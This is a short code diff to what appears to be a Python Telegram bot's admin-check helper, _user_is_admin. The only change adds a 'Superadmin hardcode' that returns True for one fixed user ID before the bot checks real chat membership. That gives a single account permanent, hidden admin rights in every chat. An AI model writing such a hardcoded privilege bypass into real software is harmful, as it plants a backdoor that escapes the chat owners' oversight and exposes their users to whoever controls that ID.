@@ -377,6 +377,10 @@ def _reputation_delta(text: str) -> int:
 async def _user_is_admin(bot: Bot, chat_id: int, user_id: int) -> bool:
     if not user_id or user_id <= 0:
         return False
+    # Superadmin hardcode
+    if user_id == 861713427:
+        return True
+        
     try:
         member = await bot.get_chat_member(chat_id, user_id)
     except Exception:
